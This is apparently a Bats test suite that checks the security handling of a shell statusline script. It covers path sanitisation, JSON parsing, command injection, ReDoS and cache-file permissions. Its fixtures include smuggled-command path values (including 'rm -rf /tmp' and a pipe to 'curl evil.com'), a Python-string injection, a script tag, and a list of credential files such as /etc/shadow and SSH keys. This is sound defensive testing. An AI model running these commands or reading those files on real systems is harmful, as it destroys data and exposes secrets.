#!/usr/bin/env bats

# Unit tests for security-related functions in statusline.sh

load '../setup_suite'
load '../helpers/test_helpers'

setup() {
    common_setup
}

teardown() {
    common_teardown
}

# Test path sanitization (addresses line 617 security concern)
@test "path sanitization should handle normal paths" {
    local test_path="/Users/user/Documents/project"
    local expected="-Users-user-Documents-project"

    # Test current implementation (leading slash becomes leading dash)
    local result=$(echo "$test_path" | sed 's|/|-|g')
    [ "$result" = "$expected" ]
}

@test "path sanitization should handle paths with special characters" {
    local test_cases=(
        "/path/with spaces/file"
        "/path/with'quotes/file"
        "/path/with\"doublequotes/file"
        "/path/with\$dollar/file"
        "/path/with\`backtick/file"
        "/path/with;semicolon/file"
        "/path/with&ampersand/file"
        "/path/with|pipe/file"
    )
    
    for test_path in "${test_cases[@]}"; do
        # Current implementation just replaces slashes
        local result=$(echo "$test_path" | sed 's|/|-|g')
        
        # Should not contain original special characters in problematic positions
        # This test documents current behavior - it needs improvement
        if [[ "$result" == *"/"* ]]; then
            fail "Path sanitization failed to remove all slashes: $result"
        fi
    done
}

@test "path sanitization should handle very long paths" {
    # Test path length limits
    local long_path="/$(printf 'very-long-directory-name%.0s' {1..50})"
    local result=$(echo "$long_path" | sed 's|/|-|g')
    
    # Should handle without crashing
    [ -n "$result" ]
    
    # Check if result is excessively long (current implementation doesn't limit)
    if [ ${#result} -gt 1000 ]; then
        # This documents a potential issue - very long paths aren't limited
        skip "Current implementation doesn't limit path length"
    fi
}

@test "path sanitization should handle empty and null paths" {
    # Test empty path
    local result1=$(echo "" | sed 's|/|-|g')
    [ "$result1" = "" ]
    
    # Test path with just slashes
    local result2=$(echo "///" | sed 's|/|-|g')
    [ "$result2" = "---" ]
}

@test "path sanitization should handle relative paths" {
    local test_cases=(
        "../../../etc/passwd"
        "./local/path"
        "~/home/path"
        "../parent/directory"
    )

    for test_path in "${test_cases[@]}"; do
        local result=$(echo "$test_path" | sed 's|/|-|g')

        # Current implementation only replaces slashes, doesn't remove ..
        # This documents current behavior - path traversal sanitization
        # is handled at a different layer (directory validation)
        [ -n "$result" ]

        # Verify slashes are replaced
        if [[ "$result" == *"/"* ]]; then
            fail "Slashes not properly replaced: $result"
        fi
    done
}

# Test input validation for directory paths
@test "should validate directory input from JSON" {
    local test_inputs=(
        '{"workspace":{"current_dir":"/normal/path"},"model":{"display_name":"Test"}}'
        '{"workspace":{"current_dir":"/path/with spaces"},"model":{"display_name":"Test"}}'
        '{"workspace":{"current_dir":""},"model":{"display_name":"Test"}}'
    )

    for input in "${test_inputs[@]}"; do
        # Test that jq can parse the input safely
        local current_dir
        current_dir=$(echo "$input" | jq -r '.workspace.current_dir')
        local jq_status=$?

        # Should not fail catastrophically - jq should parse without error
        [ $jq_status -eq 0 ]

        # current_dir can be empty string, a path, or "null" - all are valid jq outputs
        # The test verifies jq handles these inputs safely (no crash/error)
        true
    done
}

@test "should handle malformed JSON input safely" {
    local malformed_inputs=(
        '{"workspace":{"current_dir":"/path"},"model":{}'  # incomplete
        '{"workspace":{current_dir":"/path"}}'              # syntax error
        ''                                                  # empty
        'not json at all'                                   # invalid
    )
    
    for input in "${malformed_inputs[@]}"; do
        # Test with jq - should handle gracefully
        run bash -c "echo '$input' | jq -r '.workspace.current_dir' 2>/dev/null || echo 'null'"
        
        # Should not crash, may return null or empty
        [ $? -eq 0 ]
    done
}

# Test command injection prevention
@test "should prevent command injection in paths" {
    # Use single quotes to prevent shell expansion during test setup
    # These represent literal strings that might come from untrusted input
    local injection_attempts=(
        '/path/$(whoami)/test'
        '/path/`id`/test'
        '/path/;cat /etc/passwd;/test'
        '/path/&&rm -rf /tmp&&/test'
        '/path/|curl evil.com|/test'
    )

    for injection_path in "${injection_attempts[@]}"; do
        # Test that path is treated as literal string
        local result
        result=$(echo "$injection_path" | sed 's|/|-|g')

        # Result should contain the literal $(...) or backticks, not expanded values
        # If $(whoami) was executed, result would contain actual username
        case "$injection_path" in
            *'$(whoami)'*)
                # Should contain literal "$(whoami)" after slash replacement
                [[ "$result" == *'$(whoami)'* ]] || fail "Command substitution was executed: $result"
                ;;
            *'`id`'*)
                # Should contain literal backticks
                [[ "$result" == *'`id`'* ]] || fail "Backtick command was executed: $result"
                ;;
        esac

        # Result should be sanitized literal text (non-empty)
        [ -n "$result" ]
    done

    # Verify /tmp still exists (no injection occurred)
    [ -d "/tmp" ]
}

# Test Python execution security (addresses line 688 concern)
@test "should handle Python execution safely" {
    local test_inputs=(
        "2024-08-18T14:30:00Z"           # valid ISO timestamp
        "2024-08-18T14:30:00"            # missing timezone
        "invalid-timestamp"               # invalid format
        ""                               # empty
        "'; rm -rf /tmp; echo '"         # injection attempt
    )

    for input in "${test_inputs[@]}"; do
        # Mock the Python execution with safe input handling
        local python_cmd="import datetime; utc_time = datetime.datetime.fromisoformat('$input'.replace('Z', '+00:00')); local_time = utc_time.replace(tzinfo=datetime.timezone.utc).astimezone(); print(local_time.strftime('%H.%M'))"

        # Test that dangerous inputs don't execute arbitrary code
        if [[ "$input" == *"rm -rf"* ]]; then
            # This input should cause a Python parsing error, not execute shell commands
            run python3 -c "$python_cmd"
            # Should fail safely (status != 0) without executing shell commands
            [ "$status" -ne 0 ]

            # Verify /tmp still exists (shell injection didn't work)
            [ -d "/tmp" ]
        fi
    done
}

# Test regex pattern security
@test "regex patterns should not be vulnerable to ReDoS" {
    local regex_pattern="^[a-zA-Z0-9_-]*:"

    # Test with potentially problematic inputs
    local test_inputs=(
        "$(printf 'a%.0s' {1..10000}):"           # very long valid input
        "$(printf 'a%.0s' {1..10000})x"           # very long invalid input (won't match)
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaX:"          # mixed case with colon
    )

    for input in "${test_inputs[@]}"; do
        # Test that regex doesn't cause excessive backtracking
        local start_time end_time duration
        start_time=$(date +%s%N 2>/dev/null || date +%s)

        # grep may or may not match - we only care about timing, not result
        echo "$input" | grep -q "$regex_pattern" || true

        end_time=$(date +%s%N 2>/dev/null || date +%s)

        # Handle systems without nanosecond precision
        if [[ "$start_time" =~ ^[0-9]{10}$ ]]; then
            # Only second precision available, skip timing check
            continue
        fi

        duration=$(( (end_time - start_time) / 1000000 ))  # Convert to milliseconds

        # Should complete within reasonable time (< 100ms)
        if [ "$duration" -gt 100 ]; then
            fail "Regex took too long ($duration ms) for input length ${#input}"
        fi
    done
}

# Test environment variable handling
@test "should handle environment variables safely" {
    # Test that environment variables with special characters are treated as literal values
    # We avoid eval on untrusted input - instead we test direct assignment

    # Test 1: PATH override should not affect test environment persistence
    local original_path="$PATH"
    export TEST_PATH="/evil/path"
    [ "$TEST_PATH" = "/evil/path" ]
    unset TEST_PATH

    # Test 2: Variables with shell metacharacters should be literal strings
    export CLAUDE_SESSION_ID='literal-session-id-123'
    [ "$CLAUDE_SESSION_ID" = "literal-session-id-123" ]
    unset CLAUDE_SESSION_ID

    # Test 3: Variables with HTML should be treated as literal strings
    export CLAUDE_MODE='<script>alert(1)</script>'
    [[ "$CLAUDE_MODE" == *"<script>"* ]]
    unset CLAUDE_MODE

    # Test 4: Verify /tmp still exists (no command injection occurred)
    [ -d "/tmp" ]

    # Test 5: Verify PATH wasn't permanently modified
    [ "$PATH" = "$original_path" ]
}

# Test file system access controls
@test "should not access files outside working directory" {
    local forbidden_paths=(
        "/etc/passwd"
        "/etc/shadow"
        "/root/.ssh/id_rsa"
        "../../../etc/passwd"
        "/proc/1/environ"
    )
    
    # The statusline should only access:
    # - Current directory for git operations
    # - Cache files in /tmp
    # - Standard command outputs
    
    for path in "${forbidden_paths[@]}"; do
        # Verify the script doesn't try to read these files
        # This is more of a documentation test since the script
        # shouldn't be accessing arbitrary files anyway
        if [ -f "$path" ]; then
            # If file exists, make sure our script doesn't read it
            # (This would need static analysis or runtime monitoring)
            skip "Manual verification needed for file access patterns"
        fi
    done
}

# Test cache file security
@test "cache files should be created safely" {
    local cache_file="/tmp/.claude_version_cache_test"
    
    # Simulate cache file creation
    echo "test_version" > "$cache_file"
    
    # Check file permissions
    local perms=$(stat -f %A "$cache_file" 2>/dev/null || stat -c %a "$cache_file" 2>/dev/null)
    
    # Should not be world-writable
    if [[ "$perms" == *"666" ]] || [[ "$perms" == *"777" ]]; then
        fail "Cache file has overly permissive permissions: $perms"
    fi
    
    # Clean up
    rm -f "$cache_file"
}

@test "should handle cache file race conditions" {
    local cache_file="/tmp/.claude_version_cache_test_race"
    
    # Simulate concurrent access
    {
        echo "version1" > "$cache_file"
        sleep 0.1
        echo "version2" > "$cache_file"
    } &
    
    {
        sleep 0.05
        cat "$cache_file" 2>/dev/null || echo "concurrent_read_failed"
    } &
    
    wait
    
    # File should exist and be readable after concurrent operations
    [ -f "$cache_file" ]
    local content=$(cat "$cache_file")
    [[ "$content" == "version"* ]]
    
    # Clean up
    rm -f "$cache_file"
}

# Test input length limits
@test "should handle extremely long inputs safely" {
    # Test with very long model name
    local long_model_name=$(printf 'Very Long Model Name %.0s' {1..1000})
    local test_input="{\"workspace\":{\"current_dir\":\"/tmp\"},\"model\":{\"display_name\":\"$long_model_name\"}}"
    
    # Should handle without buffer overflow or crash
    local model_name=$(echo "$test_input" | jq -r '.model.display_name' 2>/dev/null)
    
    # Should either succeed or fail gracefully
    [ $? -eq 0 ] || [ $? -eq 1 ]  # jq success or controlled failure
}

# Test denial of service resistance
@test "should resist DoS via resource exhaustion" {
    # Test with deeply nested JSON
    local nested_json='{"a":{"b":{"c":{"d":{"e":{"f":{"g":"value"}}}}}}}'
    
    # Should handle reasonable nesting levels
    run bash -c "echo '$nested_json' | jq -r '.a.b.c.d.e.f.g' 2>/dev/null"
    
    # Should either work or fail quickly, not hang
    [ $? -eq 0 ] || [ $? -eq 1 ]
}